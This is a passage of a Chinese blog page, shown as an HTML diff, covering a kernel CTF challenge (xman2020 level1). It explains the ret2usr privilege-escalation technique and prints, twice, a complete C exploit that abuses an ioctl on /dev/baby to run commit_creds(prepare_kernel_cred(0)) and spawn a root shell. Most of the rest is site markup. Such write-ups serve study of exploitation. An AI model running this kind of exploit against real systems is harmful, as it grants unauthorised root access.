%8F%90%E6%9D%83%E4%B8%BA%E4%B8%BB%E8%A6%81%E7%9A%84%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95%EF%BC%8C%E4%B8%8D%E8%BF%87%E7%9B%B8%E6%AF%94%E8%B5%B7%E6%9E%84%E9%80%A0%E5%86%97%E9%95%BF%E7%9A%84%20ROP%20chain%EF%BC%8Cret2usr%20%E5%8F%AA%E9%9C%80%E6%88%91%E4%BB%AC%E8%A6%81%E6%8F%90%E5%89%8D%E5%9C%A8%E7%94%A8%E6%88%B7%E6%80%81%E7%A8%8B%E5%BA%8F%E6%9E%84%E9%80%A0%E5%A5%BD%E5%AF%B9%E5%BA%94%E7%9A%84%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88%E3%80%81%E8%8E%B7%E5%8F%96%E7%9B%B8%E5%BA%94%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80%E5%90%8E%E7%9B%B4%E6%8E%A5%20ret%20%E5%9B%9E%E5%88%B0%E7%94%A8%E6%88%B7%E7%A9%BA%E9%97%B4%E6%89%A7%E8%A1%8C%E5%8D%B3%E5%8F%AF%E3%80%82</a></p>
 <p>ret2usr的攻击方式是，在内核中执行 commit_creds(prepare_kernel_cred(NULL)) 这个函数调用，把当前进程的cred结构体替换成root权限的cred结构体提权，然后使用swapgs 和 iret去切换到用户态，执行用户态中text段的system(&#x2F;bin&#x2F;sh)，这样就有root权限的shell了</p>
 <p>iret这个指令需要保证栈布局为，所以，在和字符设备交互前，需要把用户态下的段寄存器 flag寄存器保存一下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rsp --&gt; user_rip</span><br><span class="line">--&gt; user_cs_register</span><br><span class="line">--&gt; user_flag_register</span><br><span class="line">--&gt; user_sp_register</span><br><span class="line">--&gt; user_ss_register</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">rsp --&gt; user_rip
+--&gt; user_cs_register
+--&gt; user_flag_register
+--&gt; user_sp_register
+--&gt; user_ss_register<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>其中user_rip这个位置可以写执行system binsh函数调用的地址</p>
 <p>prepare_kernel_cred commit_creds这两个是内核中的函数，可以通过这两条命令去找他的地址，需要在root权限下才能找到，kallsyms这个文件存放着内核相关的符号，因为题目没有开启kaslr，所以prepare_kernel_cred 和 commit_creds 的地址的固定的，然后关于cred结构体上面的连接有介绍</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep prepare_kernel_cred  /proc/kallsyms 从内核符号表中查找符号</span><br><span class="line">grep commit_creds /proc/kallsyms</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">grep prepare_kernel_cred  &#x2F;proc&#x2F;kallsyms 从内核符号表中查找符号
+grep commit_creds &#x2F;proc&#x2F;kallsyms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>然后关于at&amp;t的汇编 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/wingsummer/p/16305622.html">https://www.cnblogs.com/wingsummer/p/16305622.html</a> 这里有一篇文章</p>
 <p>exp:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"><span class="type">void</span>* (*prepare_kernel_cred)(<span class="type">void</span>*) KERNCALL = (<span class="type">void</span>*) <span class="number">0xffffffff810b9d80</span>;</span><br><span class="line"><span class="type">void</span> (*commit_creds)(<span class="type">void</span>*) KERNCALL = (<span class="type">void</span>*) <span class="number">0xffffffff810b99d0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_usermode_status</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;movq %%cs, %0;&quot;</span></span><br><span class="line">        <span class="string">&quot;movq %%ss, %1;&quot;</span></span><br><span class="line">        <span class="string">&quot;movq %%rsp, %2;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushfq;&quot;</span></span><br><span class="line">        <span class="string">&quot;popq %3;&quot;</span></span><br><span class="line">        : <span class="string">&quot;=r&quot;</span> (user_cs), <span class="string">&quot;=r&quot;</span> (user_ss), <span class="string">&quot;=r&quot;</span> (user_sp), <span class="string">&quot;=r&quot;</span> (user_rflags) : : <span class="string">&quot;memory&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">  <span class="keyword">asm</span>(</span><br><span class="line">    <span class="string">&quot;pushq   %0;&quot;</span></span><br><span class="line">    <span class="string">&quot;pushq   %1;&quot;</span></span><br><span class="line">    <span class="string">&quot;pushq   %2;&quot;</span></span><br><span class="line">    <span class="string">&quot;pushq   %3;&quot;</span></span><br><span class="line">    <span class="string">&quot;pushq   $get_shell;&quot;</span></span><br><span class="line">    <span class="string">&quot;swapgs;&quot;</span></span><br><span class="line">    <span class="string">&quot;iretq;&quot;</span></span><br><span class="line">    ::<span class="string">&quot;m&quot;</span>(user_ss), <span class="string">&quot;m&quot;</span>(user_sp), <span class="string">&quot;m&quot;</span>(user_rflags), <span class="string">&quot;m&quot;</span>(user_cs));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  </span><br><span class="line">  <span class="type">void</span> *buf[<span class="number">0x100</span>];</span><br><span class="line">  save_usermode_status();</span><br><span class="line">  <span class="type">int</span> fd = open(<span class="string">&quot;/dev/baby&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to open driver\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x100</span>; i++) &#123;</span><br><span class="line">      buf[i] = &amp;payload;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ioctl(fd, <span class="number">0x6001</span>, buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;pthread.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>
 
 
-    </article>
-    <!-- license -->
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">KERNCALL</span> <span class="token expression"><span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">regparm</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span>
+<span class="token keyword">void</span><span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">*</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span> KERNCALL <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token number">0xffffffff810b9d80</span><span class="token punctuation">;</span>
+<span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span> KERNCALL <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token number">0xffffffff810b99d0</span><span class="token punctuation">;</span>
+
+<span class="token keyword">unsigned</span> <span class="token keyword">long</span> user_cs<span class="token punctuation">,</span> user_ss<span class="token punctuation">,</span> user_rflags<span class="token punctuation">,</span> user_sp<span class="token punctuation">;</span>
+
+<span class="token keyword">void</span> <span class="token function">save_usermode_status</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">asm</span><span class="token punctuation">(</span>
+        <span class="token string">"movq %%cs, %0;"</span>
+        <span class="token string">"movq %%ss, %1;"</span>
+        <span class="token string">"movq %%rsp, %2;"</span>
+        <span class="token string">"pushfq;"</span>
+        <span class="token string">"popq %3;"</span>
+        <span class="token operator">:</span> <span class="token string">"=r"</span> <span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span> <span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span> <span class="token punctuation">(</span>user_sp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span> <span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token operator">:</span> <span class="token string">"memory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+
+<span class="token keyword">void</span> <span class="token function">get_shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+
+<span class="token keyword">void</span> <span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token function">commit_creds</span><span class="token punctuation">(</span><span class="token function">prepare_kernel_cred</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">asm</span><span class="token punctuation">(</span>
+    <span class="token string">"pushq   %0;"</span>
+    <span class="token string">"pushq   %1;"</span>
+    <span class="token string">"pushq   %2;"</span>
+    <span class="token string">"pushq   %3;"</span>
+    <span class="token string">"pushq   $get_shell;"</span>
+    <span class="token string">"swapgs;"</span>
+    <span class="token string">"iretq;"</span>
+    <span class="token operator">::</span><span class="token string">"m"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"m"</span><span class="token punctuation">(</span>user_sp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"m"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"m"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  
+  <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token function">save_usermode_status</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/baby"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[-] Failed to open driver\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">0x100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>payload<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0x6001</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+	  <div class="article-footer-copyright">
+	Ciallo～(∠・ω< )⌒★
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
     
-        <div class="license-wrapper">
-            <p>Author：<a href="https://nyyyddddn.github.io">nyyyddddn</a>
-            <p>Link：<a href="https://nyyyddddn.github.io/2024/03/31/%E5%B0%9D%E8%AF%95%E7%BC%96%E8%AF%91kernel%E5%92%8C%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/">https://nyyyddddn.github.io/2024/03/31/%E5%B0%9D%E8%AF%95%E7%BC%96%E8%AF%91kernel%E5%92%8C%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/</a>
-            <p>Publish date：<a href="https://nyyyddddn.github.io/2024/03/31/%E5%B0%9D%E8%AF%95%E7%BC%96%E8%AF%91kernel%E5%92%8C%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/">March 31st 2024, 9:56:28 pm</a>
-            <p>Update date：<a href="https://nyyyddddn.github.io/2024/03/31/%E5%B0%9D%E8%AF%95%E7%BC%96%E8%AF%91kernel%E5%92%8C%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/">August 25th 2024, 1:07:37 am</a>
-            <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
-        </div>
     
-    <!-- paginator -->
-    <ul class="post-paginator">
-        <li class="next">
-            
-                <div class="nextSlogan">Next Post</div>
-                <a href="/2024/04/24/geekcon/" title="geekcon">
-                    <div class="nextTitle">geekcon</div>
-                </a>
-            
-        </li>
-        <li class="previous">
-            
-                <div class="prevSlogan">Previous Post</div>
-                <a href="/2024/03/27/nkctf-wp/" title="nkctf_wp">
-                    <div class="prevTitle">nkctf_wp</div>
-                </a>
-            
-        </li>
+    <a href="/2024/04/24/geekcon/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/03/27/nkctf-wp/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-03-31 
+	</div>
+	
+
+	<!-- categories -->
+    
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/misc/">misc<span>8</span></a></li>
     </ul>
-    <!-- comment -->
-    
-        <div class="post-comment">
-            <!-- 来必力 City 版安装代码 -->
+	</div>
+		
 
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
 
-            
+		
 
-            
+	</div>
+	
+		
 
-            
+</div><!-- row -->
 
-            <!-- utteranc评论 -->
-
-
-            <!-- partial('_partial/comment/changyan') -->
-            <!--PC版-->
-
-
-            
-            
-
-            
-
-        </div>
-    
-    <!-- timeliness note -->
-    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
-    
-    <!-- Mathjax -->
-    
-</main>
-
-                <!-- profile -->
-                
-            </div>
-            <footer class="footer footer-unloaded">
-    <!-- social  -->
-    
-        <div class="social">
-            
-    
-        
-            
-                <a href="mailto:1959759892@qq.com" class="iconfont-archer email" title=email ></a>
-            
-        
-    
-        
-            
-                <a href="//github.com/nyyyddddn" class="iconfont-archer github" target="_blank" title=github></a>
-            
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-
-
-        </div>
-    
-    <!-- powered by Hexo  -->
-    <div class="copyright">
-        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
-    </div>
-    <!-- website approve for Chinese user -->
-    
-    <!-- 不蒜子  -->
-    
-        <div class="busuanzi-container">
-            
-             
-                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
-            
-        </div>
-    	
-</footer>
-
-        </div>
-        <!-- toc -->
-        
-            <div class="toc-wrapper toc-wrapper-loding" style=
+<!--
+ -->
 
 
 
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 nyyyddddn's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
 
 
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
 
 
-    top:50vh;
-
->
-                <div class="toc-catalog">
-                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
-                </div>
-                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E7%BC%96%E8%AF%91kernel%E5%92%8C%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%EF%BC%8C%E4%BD%BF%E7%94%A8qemu%E5%90%AF%E5%8A%A8"><span class="toc-number">1.</span> <span class="toc-text">尝试编译kernel和文件系统，使用qemu启动</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#step1-make-filesystem-compile-busybox"><span class="toc-number">1.1.</span> <span class="toc-text">step1:make filesystem (compile busybox)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#step2-download-compile-kernel"><span class="toc-number">1.2.</span> <span class="toc-text">step2:download &amp; compile kernel</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#step3-write-a-script-to-start-qemu"><span class="toc-number">1.3.</span> <span class="toc-text">step3: write a script to start qemu</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ctf-challenge"><span class="toc-number">2.</span> <span class="toc-text">ctf challenge</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#xman2020-level1"><span class="toc-number">2.1.</span> <span class="toc-text">xman2020 level1</span></a></li></ol></li></ol>
-            </div>
-        
-        <!-- sidebar -->
-        <div class="sidebar sidebar-hide">
-    <ul class="sidebar-tabs sidebar-tabs-active-0">
-        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
-        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
-        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
-    </ul>
-    <div class="sidebar-content sidebar-content-show-archive">
-        <div class="sidebar-panel-archives">
-    <!-- 在 ejs 中将 archive 按照时间排序 -->
-    
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-    
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
